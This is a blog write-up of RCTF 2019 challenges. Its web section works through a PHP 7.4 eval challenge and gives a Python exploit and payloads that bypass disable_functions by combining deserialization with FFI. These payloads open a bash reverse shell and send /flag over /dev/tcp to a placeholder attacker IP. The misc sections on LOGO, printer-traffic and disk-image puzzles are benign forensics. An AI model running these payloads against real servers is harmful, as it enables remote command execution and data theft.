<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  

  
  <title>RCTF2019 writeup | zww</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="2019 RCTF">
<meta name="keywords" content="CTF,RCTF,php7.4,反弹shell,disk">
<meta property="og:type" content="article">
<meta property="og:title" content="RCTF2019 writeup">
<meta property="og:url" content="http://yoursite.com/2019/05/26/RCTF2019/index.html">
<meta property="og:site_name" content="zww">
<meta property="og:description" content="2019 RCTF">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture2.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture3.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture4.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture6.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture7.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture8.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture9.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture10.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture12.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture13.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture15.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture16.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture17.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture18.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture19.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture20.png">
<meta property="og:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture21.png">
<meta property="og:updated_time" content="2019-07-09T02:10:34.116Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="RCTF2019 writeup">
<meta name="twitter:description" content="2019 RCTF">
<meta name="twitter:image" content="http://yoursite.com/2019/05/26/RCTF2019/Picture2.png">
  
    <link rel="alternate" href="/atom.xml" title="zww" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">zww</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-RCTF2019" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/05/26/RCTF2019/" class="article-date">
  <time datetime="2019-05-26T02:24:52.000Z" itemprop="datePublished">2019-05-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      RCTF2019 writeup
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <hr>
<p><strong>2019 RCTF</strong><br><a id="more"></a></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="0x00-nextphp"><a href="#0x00-nextphp" class="headerlink" title="0x00 nextphp"></a>0x00 nextphp</h3><p><a href="http://nextphp.2019.rctf.rois.io" target="_blank" rel="noopener">http://nextphp.2019.rctf.rois.io</a><br>打开题目后，可以看到能够通过GET传递参数a，并通过eval执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>a=phpinfo();</strong><br><img src="/2019/05/26/RCTF2019/Picture2.png" alt><br>这是php的下一个准备推出的新版本php7.4<br>但是当想要使用eval去执行system或者别的系统函数时，都不能成功<br>因为这里disable_functions禁用了很多函数<br><img src="/2019/05/26/RCTF2019/Picture3.png" alt><br>看来不能从这里入手，只能去翻阅最新文档，查看php7.4的新特性<br><img src="/2019/05/26/RCTF2019/Picture4.png" alt><br>链接:<br><a href="https://stitcher.io/blog/new-in-php-74#foreign-function-interface-rfc" target="_blank" rel="noopener">https://stitcher.io/blog/new-in-php-74#foreign-function-interface-rfc</a><br><a href="https://zhuanlan.zhihu.com/p/60544350" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/60544350</a><br>之前尝试扫过目录（用御剑），只扫出了一个index.php<br>但是这里有eval函数，利用scandir函数来读取文件的目录<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="keyword">echo</span> <span class="keyword">__FILE__</span>;<span class="comment">// 读取当前路径</span></span><br><span class="line">a = print_r(scandir(‘/<span class="keyword">var</span>/www/html’));</span><br><span class="line">a = print_r(show_source(‘preload.php’));<span class="comment">// 读取文件</span></span><br></pre></td></tr></table></figure></p>
<p>得到preload.php的源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>通过考察php7.4的新特性</p>
<ul>
<li><strong>preload 预加载</strong><br><a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener">https://wiki.php.net/rfc/preload</a><blockquote>
<p>一个用于提升php运行的一个新模块，提前加载到内存中，如果该php文件没有发生变化，则可以直接在内存中读取文件即可（可用于框架技术）</p>
</blockquote>
</li>
<li><strong>增添<strong>serialize和</strong>unserialize魔术方法</strong><br><a href="https://wiki.php.net/rfc/custom_object_serialization" target="_blank" rel="noopener">https://wiki.php.net/rfc/custom_object_serialization</a><br>并且这里同时implement了serializable的接口，这两个如何进行先后处理的暂时没搞明白<blockquote>
<font color="713c60">Magic methods vs interface</font> 

<p>This RFC proposes the addition of new magic methods, but using an interface instead would also be possible, though it will require some naming gymnastics to avoid RealSerializable.</p>
<p>his proposal uses magic methods for two reasons. First, they interoperate well. <strong>serialize() and </strong>unserialize() can be added to a class without compatibility concerns: They will be used on PHP 7.4 or newer and ignored on PHP 7.3 or older. Using an interface instead requires either raising the version requirement to PHP 7.4, or dealing with the definition of a stub interface in a compatible manner.</p>
<p>Second, they are semantically more correct. In PHP all objects are serializable by default. The Serializable interface is a misnomer in that sense, because an object that does not implement Serializable can be (and usually is) still serializable. On the contrary, Serializable might be implemented specifically for the purpose of forbidding serialization, by throwing an exception. The magic methods <strong>serialize() and </strong>unserialize() are just hooks to customize the serialization functionality, they do not determine whether an object can be serialized, and code should generally have no reason to check for their presence or absence.</p>
</blockquote>
</li>
<li><p><strong>FFI 外部函数接口</strong><br><a href="https://wiki.php.net/rfc/ffi" target="_blank" rel="noopener">https://wiki.php.net/rfc/ffi</a><br>是一种语言里调用另一种语言代码的技术<br>PHP的FFI扩展就是一个让你在PHP里调用C代码的技术<br><a href="http://www.php.cn/php-weizijiaocheng-415807.html" target="_blank" rel="noopener">http://www.php.cn/php-weizijiaocheng-415807.html</a></p>
<blockquote>
<p>Foreign Function Interface, FFI in short, allows calling C code from userland. This means that PHP extensions can be written in pure PHP.</p>
<p>It should be noted that this is a complex topic. You still need C knowledge to be able to correctly use this feature.</p>
</blockquote>
</li>
<li><p>小知识点–返回值:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<p>也就是说这一题的思路通过结合这几个新的特性就可以构造了<br>主要思路是通过C代码来执行系统函数，而不是php中的eval函数，而且做过预加载后，内存中已经有了C的库和某些文件，最后就是反序列化的问题了。调用系统函数，使用bash来反弹shell，来达到操控服务器的目的。</p>
<p>反弹shell学习网站:<br><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">https://xz.aliyun.com/t/2548</a><br><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549</a><br>文件标识符:<br><a href="https://www.jianshu.com/p/504a53c30c17" target="_blank" rel="noopener">https://www.jianshu.com/p/504a53c30c17</a></p>
<p><strong>构造payload</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(const char *command);'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> D();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$b = str_replace(<span class="string">'"D"'</span>, <span class="string">'"A"'</span>, $b);</span><br><span class="line">$d = unserialize($b);</span><br><span class="line">$d-&gt;ret-&gt;system(<span class="string">'bash -c "cat /flag &gt; /dev/tcp/xxx/xxx"'</span>);</span><br></pre></td></tr></table></figure></p>
<p><strong>python脚本</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nextphp</span></span><br><span class="line">url = <span class="string">'http://nextphp.2019.rctf.rois.io'</span></span><br><span class="line">cookie = <span class="string">'dc3a017c53ac29a244333ea25571d58211558239636'</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: cookie,</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15'</span>&#125;</span><br><span class="line">obj = <span class="string">'O:1:"A":3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:10:"int errno;";&#125;'</span></span><br><span class="line">obj2 = <span class="string">'a:2:&#123;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:119:"int execve(const char *path, char *const argv[], char *const envp[]);int execl(const char *path, const char *arg, ...);";&#125;'</span></span><br><span class="line">data = <span class="string">'$a=unserialize(\'%s\');var_dump($a);$a-&gt;unserialize(\'%s\');var_dump($a);$ffi=$a-&gt;__get("ret");var_dump($ffi);$ffi-&gt;execl("/bin/bash", "bash", "-c", "bash -i &gt;&amp; /dev/tcp/xxx/80 0&gt;&amp;1", NULL);'</span>%(obj, obj2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#data = '$ser=\'C:1:"A":183:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:119:"int execve(const char *path, char *const argv[], char *const envp[]);int execl(const char *path, const char *arg, ...);";&#125;&#125;\';$obj=unserialize($ser);$ffi=$obj-&gt;__get("ret");var_dump($obj);var_dump($ffi);$ffi-&gt;execl("/bin/bash", "bash", "-c", "bash -i &gt;&amp; /dev/tcp/xxx/80 0&gt;&amp;1", NULL);'</span></span><br><span class="line"></span><br><span class="line">print(data)</span><br><span class="line">params = &#123;<span class="string">'a'</span>: data&#125;</span><br><span class="line">r = requests.get(url, params=params, headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p>
<p><strong>payload1:</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj = <span class="string">'O:1:"A":3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:10:"int errno;";&#125;'</span></span><br><span class="line">obj2 = <span class="string">'a:2:&#123;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:119:"int execve(const char *path, char *const argv[], char *const envp[]);int execl(const char *path, const char *arg, ...);";&#125;'</span></span><br><span class="line">data = <span class="string">'$a=unserialize(\'%s\');var_dump($a);$a-&gt;unserialize(\'%s\');var_dump($a);$ffi=$a-&gt;__get("ret");var_dump($ffi);$ffi-&gt;execl("/bin/bash", "bash", "-c", "bash -i &gt;&amp; /dev/tcp/xxx/80 0&gt;&amp;1", NULL);'</span>%(obj, obj2)</span><br></pre></td></tr></table></figure></p>
<p><strong>payload2:</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">'$ser=\'C:1:"A":183:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:119:"int execve(const char *path, char *const argv[], char *const envp[]);int execl(const char *path, const char*arg, ...);";&#125;&#125;\';$obj=unserialize($ser);$ffi=$obj-&gt;__get("ret");var_dump($obj);var_dump($ffi);$ffi-&gt;execl("/bin/bash", "bash", "-c", "bash -i &gt;&amp; /dev/tcp/xxx/80 0&gt;&amp;1", NULL);'</span></span><br></pre></td></tr></table></figure></p>
<p><strong>payload3:</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">'$ser=\'C:1:"A":95:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int system(const char *command);";&#125;&#125;\';$obj=unserialize($ser);$ffi=$obj-&gt;__get("ret");$ffi-&gt;system(\'bash -c "cat /flag &gt; /dev/tcp/xxx/80"\');'</span></span><br></pre></td></tr></table></figure></p>
<p>( payload3不需要弹shell，但是需要知道flag的位置 )</p>
<p>这里的xxx为公网ip地址<br>在服务器上使用netcat监听80端口（nc –lvp 80），将payload提交后，就能够实现反弹shell</p>
<p><img src="/2019/05/26/RCTF2019/Picture6.png" alt><br>flag在根目录下<br><img src="/2019/05/26/RCTF2019/Picture7.png" alt></p>
<hr>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x00-draw"><a href="#0x00-draw" class="headerlink" title="0x00 draw"></a>0x00 draw</h3><p><img src="/2019/05/26/RCTF2019/Picture8.png" alt><br>复制前几个序列并搜索，可以了解到这是一个LOGO的绘图语言<br>使用在线绘图网站<br><a href="https://www.calormen.com/jslogo/?lang=eo" target="_blank" rel="noopener">https://www.calormen.com/jslogo/?lang=eo</a><br>得到flag<br><img src="/2019/05/26/RCTF2019/Picture9.png" alt></p>
<h3 id="0x01-printer"><a href="#0x01-printer" class="headerlink" title="0x01 printer"></a>0x01 printer</h3><p>下载得到一个pcapng文件，使用的是USB协议，可以说这是一个监控硬件的流量包<br>找到两个out输出流并提取数据<br><img src="/2019/05/26/RCTF2019/Picture10.png" alt><br><img src="/2019/05/26/RCTF2019/Picture12.png" alt><br>查阅资料可得，这是一个标签打印机的抓包数据<br><a href="http://www.mamicode.com/info-detail-2571063.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-2571063.html</a><br><a href="http://www.cleversoft.com.ar/descargas/utilidades/Impresoras/Tsc/TSPL_TSPL2_Programming2.pdf" target="_blank" rel="noopener">http://www.cleversoft.com.ar/descargas/utilidades/Impresoras/Tsc/TSPL_TSPL2_Programming2.pdf</a><br>根据其规则提取有效数据，绘图<br>BITMAP参数和画图规则<br><img src="/2019/05/26/RCTF2019/Picture13.png" alt><br>也就是说列数是由第四个参数决定，而行的规则是将两个十六进制转为位表示模式（共8位）作为一个byte组合，最后为1的区域是填充的颜色，为0是不填充的区域<br>题目参数如下</p>
<p><font color="grey">BITMAP 138, 75, 26, 48, 1</font><br>也就是说我们的画布大小为行26*8（像素），列48（像素），使用python画图<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sum = [[] <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">48</span>)]</span><br><span class="line">img2 = Image.new(<span class="string">"RGBA"</span>, (<span class="number">26</span> * <span class="number">8</span>, <span class="number">48</span>), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./CTF/RCTF/Misc/printer/2.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line">    s = binascii.unhexlify(content)</span><br><span class="line">    print(len(s))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(s)):</span><br><span class="line">        j = x % <span class="number">26</span>  <span class="comment"># 列</span></span><br><span class="line">        i = x // <span class="number">26</span>  <span class="comment"># 行</span></span><br><span class="line"></span><br><span class="line">        byte = bin(s[x])[<span class="number">2</span>:]</span><br><span class="line">        tmp = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> len(byte) &lt; <span class="number">8</span>:</span><br><span class="line">            byte = <span class="string">'0'</span> + byte</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(len(byte)):</span><br><span class="line">            tmp.append(byte[y])</span><br><span class="line">        sum[i].append(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> sum[i][j][k] == <span class="string">'1'</span>:</span><br><span class="line">                img2.putpixel((j * <span class="number">8</span> + k, i), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">img2.save(<span class="string">'./2.png'</span>)</span><br></pre></td></tr></table></figure></p>
<p>得到图片<br><img src="/2019/05/26/RCTF2019/Picture15.png" alt><br>BAR的参数以及画图的规则<br><img src="/2019/05/26/RCTF2019/Picture16.png" alt><br>设置好边界和偏移量即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">img = Image.new(<span class="string">"RGBA"</span>, (<span class="number">1024</span>, <span class="number">1024</span>), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./1.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        line = f.readline()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = line.split()[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">            data[i] = data[i].rstrip(<span class="string">','</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(int(data[<span class="number">0</span>]), int(data[<span class="number">0</span>]) + int(data[<span class="number">2</span>])):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(int(data[<span class="number">1</span>]), int(data[<span class="number">1</span>]) + int(data[<span class="number">3</span>])):</span><br><span class="line">                img.putpixel((i, j), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">img.save(<span class="string">'./1.png'</span>)</span><br></pre></td></tr></table></figure></p>
<p>得到图片<br><img src="/2019/05/26/RCTF2019/Picture17.png" alt><br>最后组合flag即可</p>
<h3 id="0x02-disk"><a href="#0x02-disk" class="headerlink" title="0x02 disk"></a>0x02 disk</h3><p>这一题是在writeup出来后，复现了一遍<br><a href="https://github.com/zsxsoft/my-ctf-challenges/blob/master/rctf2019/disk/readme.md" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/blob/master/rctf2019/disk/readme.md</a></p>
<p>首先得到的是一个vmdk文件和一个VecaCrypt的磁盘加密软件。<br>VecaCrypt原理 : <a href="https://blog.csdn.net/cmzsteven/article/details/54908125" target="_blank" rel="noopener">https://blog.csdn.net/cmzsteven/article/details/54908125</a><br>使用vecacrypt加载vmdk中的fat文件（官方说要先恢复vmdk文件）<br>使用密码rctf加载<br><img src="/2019/05/26/RCTF2019/Picture18.png" alt><br>打开磁盘内文件，得到password2 = RCTF2019<br>使用密码RCTF2019加载<br><img src="/2019/05/26/RCTF2019/Picture19.png" alt><br>得到一个隐藏的磁盘，但是磁盘被加密，导致格式不正确，系统提示格式化。<br>对vmdk文件可以使用<strong>strings encrypt.vmdk</strong>得到flag的一部分<br><img src="/2019/05/26/RCTF2019/Picture20.png" alt><br>rctf{unseCure_quick_form4t_vo1ume<br>使用<strong>diskgenius</strong>查看扇区数据得到flag的其余部分<br><img src="/2019/05/26/RCTF2019/Picture21.png" alt><br>_and_corrupted_1nner_v0lume}</p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作为一个web手，做的都是杂项题，唯一做出来的nextphp7.4也是在学长的帮助下才做出来的：）<br>不过通过这一次比赛，我也学习到了很多新姿势，特别是这一道nextphp7.4，通过阅读文档来找思路写payload，在网上找不到类似的题目，要自己提取其中有用的信息，复现后还是很有意义的（可惜的是我看的那一篇中文的博客没有对FFI做介绍，导致我直接忽略掉了这个新特性。。。。</p>
<p>希望以后的比赛能做出一道题！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/05/26/RCTF2019/" data-id="ck47u3wiv001ej2xfyma9ixbr" class="article-share-link">Share</a>
      
      
